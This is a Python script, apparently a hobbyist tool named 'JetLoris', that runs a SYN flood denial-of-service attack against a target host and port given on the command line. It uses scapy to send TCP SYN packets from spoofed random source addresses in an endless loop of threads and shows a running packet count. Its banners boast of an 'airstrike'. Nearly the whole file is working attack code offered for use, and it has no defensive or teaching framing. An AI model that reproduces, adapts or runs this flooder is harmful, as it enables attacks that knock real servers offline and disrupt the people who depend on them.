import socket, random, sys, threading, os
import argparse
import getopt
from scapy.all import *

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

os.system('clear')
if len(sys.argv) != 3:
	print W + '			just a simple syn flood script...			'
	print 80 * "-" + W
	print("	 "  + GR + "              __|__            |            __|__")
	print("	 " + GR + "	    *---oOo---*      ---|---      *---oOo---*")
	print("	 " + GR +  "                             _(O)_")
	print("	" + GR + "                   *---------(|_*_|)---------*")
	print W + ''
	print("   __     ______     ______   __         ______     ______     __     ______    ")
	print("  /\ \   /\  ___\   /\__  _\ /\ \       /\  __ \   /\  == \   /\ \   /\  ___\   ")
	print(" _\_\ \  \ \  __\   \/_/\ \/ \ \ \____  \ \ \/\ \  \ \  __<   \ \ \  \ \___  \  ")
	print("/\_____\  \ \_____\    \ \_\  \ \_____\  \ \_____\  \ \_\ \_\  \ \_\  \/\_____\ ")
	print("\/_____/   \/_____/     \/_/   \/_____/   \/_____/   \/_/ /_/   \/_/   \/_____/ ") 
	print ""
	print B + '   Coded by Jet				' + P + '	Delevoped for Linux.   ' + W                                                                                               
	print 80 * "-" + W
	print "Usage:" + GR + " python %s <target> <port>" % sys.argv[0]
        if os.getuid() != 0:
            print R + '[!]' + O + ' ERROR:' + G + ' JetLoris' + O + ' must be run as ' + R + 'root' + W
            print R + '[!]' + O + ' login as root, try ' + W + '"sudo python %s"' % sys.argv[0]
	print "" + W
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
ip = socket.gethostbyname( target )
total = 0
conf.iface='en1';#network card 

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'
		send(i/t, verbose=0)
try:
	print W + '			just a simple syn flood script...			'
	print 80 * "-"
	print("		" + R + "Jet's Incoming!		")
	print W + ''
	print("                            /")
	print("                    /      /")
	print("                /  /   /  /         /")
	print("               /      /       /    /")
	print("             ,---------------.   ,-,")
	print("            /                 `-'  |")
	print '           [   A I R M A I L   |   |		' + R + 'Airstrike Inbound ' + W
	print("            \                 ,-.  |")
	print("             `---------------'   `-`")
	print 80 * "-"
	if os.getuid() != 0:
		print R + '[!]' + O + ' ERROR:' + G + ' JetLoris' + O + ' must be run as ' + R + 'root' + W
		print R + '[!]' + O + ' login as root, try ' + W + '"sudo python %s"' % sys.argv[0] + W
		sys.exit(1)
	print W + 'SYN Flooding' + O + ' %s:%i' % (target, port)
	print W + 'Domain Server:' + GR + ' [' + ip + ']'
	while 1:
		sendSYN().start()
		total += 1
		sys.stdout.write( W + "\rPackets Sent: " + G + "%i" % total)

except KeyboardInterrupt:
	    print R + '\n[!]' + O + ' Proccess Killed' + W
	    sys.exit()
